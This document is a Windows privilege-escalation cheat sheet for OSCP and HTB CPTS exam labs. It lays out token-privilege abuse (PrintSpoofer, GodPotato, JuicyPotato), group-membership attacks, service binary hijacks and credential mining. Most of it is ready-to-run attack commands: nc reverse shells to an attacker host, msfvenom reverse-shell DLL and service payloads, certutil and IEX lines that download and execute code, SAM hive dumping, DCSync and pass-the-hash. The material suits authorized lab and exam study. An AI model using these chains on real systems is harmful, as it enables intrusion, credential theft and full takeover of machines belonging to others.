Windows privesc methodology

The exam-day flow for Windows boxes — token privileges to Potato variants, group-membership abuse, service and DLL hijacks, credential mining, and the token-to-SYSTEM chains ranked by frequency.

Exam-day flow for Windows privesc — synthesised from HTB CPTS Windows boxes (hospital, media, outdated, pov, and AD boxes) + PG Practice Windows boxes (Access, AuthBy, Craft, DVR4, Fish, Hepet, Internal, Jacko, Kevin, Medjed, Mice, Monster, Nagoya, Resourced).

Prime Rules

  1. whoami /priv is the single highest-signal command. Token privileges (SeImpersonate, SeAssignPrimaryToken, SeManageVolume, SeBackup, SeRestore, SeDebug, SeTakeOwnership, SeLoadDriver) each map to a well-known escalation.
  2. whoami /all next — groups matter — Backup Operators, Print Operators, Server Operators, Remote Desktop Users, DnsAdmins, Hyper-V Administrators, Event Log Readers each map to a known privesc.
  3. Config-level primitives before kernel exploits — kernel LPEs risk crashing the box.
  4. Credentials over exploits — DPAPI, credential manager, PowerShell history, config files, LSASS all win frequently.
  5. Automation-heavy modern Windows uses UAC + AV — reboot / logout may re-run installers or service watchers. Watch for those triggers.
  6. PATH is stripped in service/H2/JNI shells — restore before diagnosis:

cmd set PATH=%SystemRoot%\system32;%SystemRoot%;

The Distilled Methodology

Phase A — First 30 Seconds

whoami /priv                                                  :: token privileges (see rank #1)
whoami /all                                                   :: groups + SIDs (see rank #2)
systeminfo                                                    :: OS build, patches
wmic qfe list                                                 :: patch list — feed to windows-exploit-suggester

:: WinPEAS (unlimited on OSCP):

:: Manual keystones:

Get-ChildItem "C:\Program Files (x86)" -Directory              :: non-standard 3rd-party apps = usually the win

Decision Tree — "I See X in whoami/enum, Try Y"

Token Privileges (whoami /priv)

Privilege Attack Tool
SeImpersonatePrivilege Print Spooler -> NamedPipe -> duplicate SYSTEM token PrintSpoofer (ps.exe -i -c cmd.exe chained from an existing shell — Nagoya), GodPotato (-cmd "cmd /c ..." — Jacko), JuicyPotato x86 with OS-specific CLSID for Server 2008 (AuthBy)
SeAssignPrimaryTokenPrivilege Same as SeImpersonate Potato variants
SeManageVolumePrivilege Grant Users FULL on C:\Windows -> drop DLL in Print driver dir -> COM trigger SeManageVolumeAbuse + PrintConfig.dll + PrintNotify COM (Access)
SeBackupPrivilege Read any file (SAM/SYSTEM/SECURITY hives) reg save HKLM\SAM C:\Temp\sam.bak, reg save HKLM\SYSTEM C:\Temp\sys.bak, secretsdump LOCAL
SeRestorePrivilege Write any file including protected ones Combines with SeBackup
SeTakeOwnershipPrivilege Take ownership of any object -> grant self access takeown /F <target>
SeLoadDriverPrivilege Load an arbitrary signed driver — CVE-2020-14979 (Capcom driver etc.) Advanced; usually needs SE_LOAD_DRIVER + admin
SeDebugPrivilege Inject into SYSTEM processes; token duplication via mimikatz mimikatz privilege::debug + sekurlsa::pth
SeShutdownPrivilege Reboot only — but pairs with writable service exe (Fish) shutdown /r /t 0

Group Membership (whoami /all)

Group Attack
Administrators Full — psexec /system, mimikatz. Already won
Backup Operators reg save hives -> offline crack
Server Operators Modify service config for existing service
Print Operators Load / unload printer drivers -> DLL load as SYSTEM
DnsAdmins Load DLL via DNS server plugin

Remote Desktop Users RDP + elevated file-dialog LPE (Mice EDB 50047)

Token Privilege -> Potato — Canonical Chain (Jacko/Nagoya/AuthBy)

PrintSpoofer (SeImpersonate — Server 2016-2019 mostly)

:: -c mangles quoted args — use -i (interactive) from an existing shell instead
C:\Temp\PrintSpoofer64.exe -i -c cmd.exe                         :: chain from xp_cmdshell shell (Nagoya)

:: Or classic:
C:\Temp\PrintSpoofer64.exe -c "C:\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe"

GodPotato (SeImpersonate — Server 2019/Win11 where PrintNightmare surface is patched)

:: Runs one command as SYSTEM and exits — does NOT upgrade current shell!
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"

:: For a full SYSTEM shell:
C:\Windows\Temp\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe"

JuicyPotato x86 (Server 2008)

certutil -urlcache -f http://<LHOST>:8000/Juicy.Potato.x86.exe jpx86.exe

:: Default CLSID fails on 2008 — feed one from ohpe's Server_2008_Standard list:
jpx86.exe -t * -l 1337 ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c C:\Users\apache\Desktop\nc.exe -e cmd.exe <LHOST> <LPORT>" ^
  -c "{4991d34b-80a1-4291-83b6-3328366b9097}"

SeManageVolume Chain (Access)

certutil -urlcache -f http://<LHOST>/SeManageVolumeExploit.exe slv.exe
.\slv.exe        # BUILTIN\Users now has FULL on C:\Windows

# Drop a payload into the Print driver dir SYSTEM Spooler will load:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o PrintConfig.dll
copy /Y PrintConfig.dll C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll

# PrintNotify COM trigger:
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
[Activator]::CreateInstance($type)

Service Binary Replacement (Fish, Hepet)

Locked exe Rename (Fish)

Service exe locked by running process; sc stop denied. Windows allows rename on locked files:

cd C:\glassfish4\glassfish\domains\domain1\bin
rename domain1Service.exe domain1Service.exe.orig
copy C:\Users\<USER>\payload.exe domain1Service.exe
shutdown /r /t 0

Payload MUST be msfvenom -f exe-service (SCM handshake — regular EXEs don't work):

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o domain1Service.exe

Non-Microsoft Auto-Start Service (Hepet)

sc qc VeyonService                                             :: BINARY_PATH_NAME + SERVICE_START_NAME
icacls "C:\Users\<USER>\Veyon\veyon-service.exe"               :: (F) = writable

move veyon-service.exe veyon-service.exe.bak
certutil -urlcache -f http://<LHOST>/veyon-service.exe veyon-service.exe
Restart-Service VeyonService                                    # or shutdown /r /t 0 if denied

Credential Mining (Canonical Order)

  1. whoami /priv — token privileges
  2. whoami /all — group membership
  3. cmdkey /list + runas /savecred
  4. type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  5. type %USERPROFILE%\.aws\credentials, .git-credentials, .npmrc
  6. type C:\ProgramData\<Vendor>\*.ini (DVR4's DVRParams.ini pattern)
  7. type C:\Windows\System32\Sysprep\unattend.xml, sysprep.inf, Panther\unattend.xml
  8. type C:\Users\<user>\AppData\Local\Microsoft\Credentials\* (DPAPI blob)
  9. PowerView / SharpDPAPI for domain-context DPAPI decryption
  10. reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" (AutoLogon)
  11. FileZilla recentservers.xml (Mice — base64 passwords)
  12. type C:\inetpub\wwwroot\web.config and every app config

Key Exam-Ready One-Liners

File Download

certutil -urlcache -f http://<LHOST>/tool.exe C:\Temp\tool.exe

:: OR PowerShell:
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/tool.ps1')"

:: OR bitsadmin:
bitsadmin /transfer job /download /priority normal http://<LHOST>/tool.exe C:\Temp\tool.exe

Reverse Shells (Payload-Agnostic)

# Attacker:
sudo nc -lvnp <LPORT>

:: Target (cmd variants):
powershell -e <B64>                                        :: Base64 UTF-16LE (Billyboss)
cmd /c "nc.exe <LHOST> <LPORT> -e cmd.exe"                 :: requires nc.exe

PATH Fix (H2/JNI/Service Shells)

set PATH=%SystemRoot%\system32;%SystemRoot%;

Password Hash Extraction (Backup Operators)

reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\sys.bak
reg save HKLM\SECURITY C:\Temp\sec.bak
:: Exfil, then on attacker:
impacket-secretsdump -sam sam.bak -system sys.bak -security sec.bak LOCAL

DCSync via Impacket

impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm

Pass-the-Hash

nxc smb <IP> -u Administrator -H <NT-hash>
impacket-psexec -hashes :<NT-hash> Administrator@<IP>
evil-winrm -i <IP> -u Administrator -H <NT-hash>

OpSec + Cleanup (Mandatory for OSCP Report)

  • Delete uploaded tools (del C:\Temp\*)
  • Remove SUID/SGID equivalents added (any writable-service payloads)
  • Undo permission changes (icacls <file> /reset)
  • Remove group memberships added (net localgroup administrators <user> /delete)
  • Reset passwords changed (coordinate with client)
  • Undo registry writes (Runkeys, AlwaysInstallElevated toggles)
  • Restart / remove services planted
  • Remove Event Log tampering artifacts

EXAM Restrictions

EXAM-RESTRICTED — one target only:

  • Metasploit exploit/aux/post modules and Meterpreter — spend on the box where manual PoC is fussiest (usually SmarterMail, HP Power Manager, EternalBlue)
  • ms17_010_eternalblue, hp_power_manager, bluekeep all count against your one

EXAM-BANNED:

  • SQLMap, SQLNinja
  • Responder poisoning (only analyse-only -A)
  • Nessus, OpenVAS, Nexpose

EXAM-OK — no limit:

  • PrintSpoofer, GodPotato, JuicyPotato, RunasCs, SeManageVolumeAbuse, mimikatz, SharpDPAPI, netexec/crackmapexec, evil-winrm, impacket, winPEAS/PrivescCheck, msfvenom, multi/handler

EXAM-Day Windows Privesc Checklist

First 30 seconds:

  • [ ] whoami /priv — token privileges
  • [ ] whoami /all — group membership
  • [ ] systeminfo -> note OS build + patches
  • [ ] net user %USERNAME% -> password-last-set
  • [ ] PATH restore if needed (set PATH=%SystemRoot%\system32;%SystemRoot%;)

Config-level probe:

  • [ ] cmdkey /list
  • [ ] type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  • [ ] type C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml
  • [ ] Every non-standard C:\Program Files (x86)\<Vendor>\ folder
  • [ ] type C:\ProgramData\*\*.ini for cred-shaped strings
  • [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" (AutoLogon)
  • [ ] reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

Enum sweep:

  • [ ] Run winPEASx64.exe or PrivescCheck.ps1
  • [ ] tasklist /v — SYSTEM processes and their commandlines
  • [ ] schtasks /query /fo LIST /v — scheduled tasks
  • [ ] sc query + sc qc <SERVICE> for non-Microsoft services

Token pathway (if privilege set):

  • [ ] SeImpersonate -> PrintSpoofer / GodPotato (2019+) / JuicyPotato x86 (2008)
  • [ ] SeManageVolume -> SeManageVolumeAbuse + PrintConfig.dll + PrintNotify COM
  • [ ] SeBackup/SeRestore -> reg save hives -> secretsdump LOCAL
  • [ ] SeDebug -> mimikatz sekurlsa::pth

Under time pressure:

  • [ ] Timebox each attempted vector at 30 min
  • [ ] Cred mining first, kernel exploits last
  • [ ] Metasploit exploit modules = one target only
  • [ ] Reboot only when confident (Fish payload placement)
